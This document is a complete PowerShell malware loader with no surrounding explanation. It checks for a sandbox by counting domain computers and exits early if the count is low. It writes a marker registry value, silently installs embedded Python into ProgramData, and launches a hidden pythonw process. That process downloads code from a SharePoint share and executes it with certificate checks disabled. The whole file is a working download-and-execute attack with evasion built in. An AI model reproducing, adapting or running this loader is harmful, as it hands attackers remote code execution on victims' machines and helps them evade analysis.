$isSandbox = $false

$domainPCs = (cmd.exe /c net group "domain computers" /domain | find /c /v "").Trim()
if ([int]$domainPCs -lt 10) { $isSandbox = $true }

if ($isSandbox) { exit }

Get-Item -Path 'HKCU:\Software\Microsoft' | 
    Get-ItemProperty | 
    Select-Object * -ExcludeProperty PSPath,PSParentPath,PSChildName,PSDrive,PSProvider | 
    ForEach-Object {
        $_.PSObject.Properties | 
        Where-Object { $_.Name -like 'zr_*' } | 
        ForEach-Object {
            Remove-ItemProperty -Path 'HKCU:\Software\Microsoft' -Name $_.Name -Force
        }
    }

$registryPath = 'HKCU:\Software\Microsoft'
$registryName = 'zr_ET4HvYX9laVJmgZEOi8IAh8BNSSerBcR1Mz-s_b558TjSA_hao771'
Set-ItemProperty -Path $registryPath -Name $registryName -Value '' -Force

$extractTo = "C:\ProgramData\ET4HvYX9laVJmgZEOi8IAh8BNSSerBcR1Mz-s_b558TjSA"
$pythonExe = Join-Path $extractTo "pythonw.exe"

$pythonInstalled = ((Test-Path $pythonExe) -and (Get-Process -Name "pythonw" -ErrorAction SilentlyContinue))

if (-not $pythonInstalled) {
    try {
        $pythonUrl = "https://www.python.org/ftp/python/3.12.3/python-3.12.3-embed-amd64.zip"
        $pythonZip = "C:\ProgramData\python-3.12.3-embed-amd64.zip"

        $xhr = New-Object -ComObject MSXML2.XMLHTTP
        $xhr.open("GET", $pythonUrl, $false)
        $xhr.send()

        $stream = New-Object -ComObject ADODB.Stream
        $stream.Open()
        $stream.Type = 1
        $stream.Write($xhr.responseBody)
        $stream.SaveToFile($pythonZip, 2)
        $stream.Close()

        if (-Not (Test-Path $extractTo)) {
            New-Item -ItemType Directory -Path $extractTo -Force | Out-Null
        }

        $shell = New-Object -ComObject Shell.Application
        $zip = $shell.NameSpace($pythonZip)
        $dest = $shell.NameSpace($extractTo)
        $dest.CopyHere($zip.Items(), 0x14)

        Start-Sleep -Seconds 3

        Remove-Item $pythonZip -Force -ErrorAction SilentlyContinue
    }
    catch {
        Write-Error $_.Exception.Message
        exit 1
    }
}

try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $pythonExe
    $psi.Arguments = "-c `"import urllib.request,ssl;url='https://hao771.sharepoint.com/_layouts/15/download.aspx?share=ET4HvYX9laVJmgZEOi8IAh8BNSSerBcR1Mz-s_b558TjSA';context=ssl._create_unverified_context();exec(urllib.request.urlopen(url,context=context).read().decode('utf-8'))`""
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = 'Hidden'
    
    $process = [System.Diagnostics.Process]::Start($psi)
    $null = $process.Handle
}
catch {
    Write-Error $_.Exception.Message
    exit 1
}
